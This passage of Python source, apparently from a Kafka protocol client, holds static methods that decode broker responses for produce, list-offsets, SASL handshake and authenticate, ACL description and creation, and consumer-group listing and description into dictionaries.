        for _ in range(topic_count):
            tname, off = decode_string(data, off)
            part_count, off = decode_int32(data, off)
            partitions = []
            for _ in range(part_count):
                p_id, off = decode_int32(data, off)
                ec, off = decode_int16(data, off)
                base_offset, off = decode_int64(data, off)
                log_append_time, off = decode_int64(data, off)
                partitions.append({
                    "partition": p_id, "error_code": ec,
                    "error": error_name(ec),
                    "base_offset": base_offset,
                    "log_append_time": log_append_time,
                })
            results.append({"topic": tname, "partitions": partitions})
        # throttle_time at end
        throttle = 0
        if off + 4 <= len(data):
            throttle, off = decode_int32(data, off)
        return {"results": results, "throttle_time_ms": throttle}

    @staticmethod
    def parse_list_offsets(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        count, off = decode_int32(data, off)
        topics = []
        for _ in range(count):
            tname, off = decode_string(data, off)
            pcount, off = decode_int32(data, off)
            partitions = []
            for _ in range(pcount):
                pid, off = decode_int32(data, off)
                ec, off = decode_int16(data, off)
                ts, off = decode_int64(data, off)
                offset, off = decode_int64(data, off)
                partitions.append({
                    "partition": pid, "error_code": ec,
                    "error": error_name(ec),
                    "timestamp": ts, "offset": offset,
                })
            topics.append({"topic": tname, "partitions": partitions})
        return {"throttle_time_ms": throttle, "topics": topics}

    @staticmethod
    def parse_sasl_handshake(data: bytes) -> Dict[str, Any]:
        off = 0
        ec, off = decode_int16(data, off)
        count, off = decode_int32(data, off)
        mechanisms = []
        for _ in range(count):
            m, off = decode_string(data, off)
            mechanisms.append(m)
        return {"error_code": ec, "error": error_name(ec), "mechanisms": mechanisms}

    @staticmethod
    def parse_sasl_authenticate(data: bytes) -> Dict[str, Any]:
        off = 0
        ec, off = decode_int16(data, off)
        emsg, off = decode_nullable_string(data, off)
        auth_bytes, off = decode_bytes(data, off)
        return {
            "error_code": ec, "error": error_name(ec),
            "error_message": emsg,
            "auth_bytes": auth_bytes.decode('utf-8', errors='replace') if auth_bytes else None,
        }

    @staticmethod
    def parse_describe_acls(data: bytes) -> Dict[str, Any]:
        # v1 response: resources -> nested acls per resource
        off = 0
        throttle, off = decode_int32(data, off)
        ec, off = decode_int16(data, off)
        emsg, off = decode_nullable_string(data, off)
        res_count, off = decode_int32(data, off)
        acls = []
        for _ in range(res_count):
            rtype, off = decode_int8(data, off)
            rname, off = decode_string(data, off)
            rpattern, off = decode_int8(data, off)
            acl_count, off = decode_int32(data, off)
            for _ in range(acl_count):
                principal, off = decode_string(data, off)
                host, off = decode_string(data, off)
                operation, off = decode_int8(data, off)
                perm_type, off = decode_int8(data, off)
                acls.append({
                    "resource_type": rtype, "resource_name": rname,
                    "resource_pattern_type": rpattern,
                    "principal": principal, "host": host,
                    "operation": operation, "permission_type": perm_type,
                })
        return {"throttle_time_ms": throttle, "error_code": ec,
                "error": error_name(ec), "error_message": emsg, "acls": acls}

    @staticmethod
    def parse_create_acls(data: bytes) -> Dict[str, Any]:
        off = 0
        throttle, off = decode_int32(data, off)
        count, off = decode_int32(data, off)
        results = []
        for _ in range(count):
            ec, off = decode_int16(data, off)
            emsg, off = decode_nullable_string(data, off)
            results.append({"error_code": ec, "error": error_name(ec),
                           "error_message": emsg})
        return {"throttle_time_ms": throttle, "results": results}

    @staticmethod
    def parse_list_groups(data: bytes) -> Dict[str, Any]:
        off = 0
        ec, off = decode_int16(data, off)
        count, off = decode_int32(data, off)
        groups = []
        for _ in range(count):
            gid, off = decode_string(data, off)
            proto, off = decode_string(data, off)
            groups.append({"group_id": gid, "protocol_type": proto})
        return {"error_code": ec, "error": error_name(ec), "groups": groups}

    @staticmethod
    def parse_describe_groups(data: bytes) -> Dict[str, Any]:
        off = 0
        count, off = decode_int32(data, off)
        groups = []
        for _ in range(count):
            ec, off = decode_int16(data, off)
            gid, off = decode_string(data, off)
            state, off = decode_string(data, off)
            proto_type, off = decode_string(data, off)
            proto, off = decode_string(data, off)
            member_count, off = decode_int32(data, off)
            members = []
            for _ in range(member_count):
                mid, off = decode_string(data, off)
                client_id, off = decode_string(data, off)
                client_host, off = decode_string(data, off)
                meta, off = decode_bytes(data, off)
                assignment, off = decode_bytes(data, off)
                members.append({
                    "member_id": mid, "client_id": client_id,
                    "client_host": client_host,
                })
            groups.append({
                "error_code": ec, "error": error_name(ec),
                "group_id": gid, "state": state,
                "protocol_type": proto_type, "protocol": proto,
                "members": members,
            })
        return {"groups": groups}
